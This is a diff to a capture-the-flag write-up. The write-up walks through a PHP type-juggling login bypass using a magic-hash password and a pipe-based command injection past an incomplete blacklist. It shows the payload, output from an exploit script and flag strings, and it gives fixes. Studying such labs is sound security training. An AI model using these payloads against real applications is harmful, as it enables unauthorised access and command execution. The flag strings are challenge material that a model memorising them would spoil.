@@ -2,6 +2,8 @@
 
 **Chain:** PHP type-juggling authentication bypass → authenticated command injection → RCE → flag.
 
+> Two flags — **FLAG1 (access):** shown on the operator console after the type-juggling auth bypass. **FLAG2 (proof):** read via the command-injection RCE (`/proof.txt`).
+
 ## 1. Read the source
 
 Four files. The interesting decisions are in two of them.
@@ -53,15 +55,15 @@ The filter is a blacklist, and it's incomplete. It removes `;`, `&` and the back
 **pipe** `|` (nor `$(...)`). User input lands directly in a shell command. So:
 
 ```
-target = 127.0.0.1 | cat /flag.txt
+target = 127.0.0.1 | cat /proof.txt
 ```
 
 becomes:
 ```
-ping -c 1 127.0.0.1 | cat /flag.txt 2>&1
+ping -c 1 127.0.0.1 | cat /proof.txt 2>&1
 ```
 
-`cat /flag.txt` runs regardless of the ping result, and its output is echoed back on the page.
+`cat /proof.txt` runs regardless of the ping result, and its output is echoed back on the page.
 **Fix:** never build a shell string from input — use `escapeshellarg()`, or avoid the shell entirely
 with `exec()`-style argument arrays. Blacklists of metacharacters are not a defence.
 
@@ -73,8 +75,8 @@ session cookie, sends the piped injection, and scrapes `FLAG{...}` from the resp
 ```
 $ python3 exploit/exploit.py http://127.0.0.1:8081
 [+] auth bypass OK  (magic-hash password: 240610708)
-[+] RCE OK          (payload: 127.0.0.1 | cat /flag.txt)
-[+] FLAG: FLAG{typ3_juggl1ng_into_a_l34ky_p1pe}
+[+] RCE OK          (payload: 127.0.0.1 | cat /proof.txt)
+[+] FLAG: FLAG2{command_injection_popped_a_shell}
 ```
 
 ## Takeaways
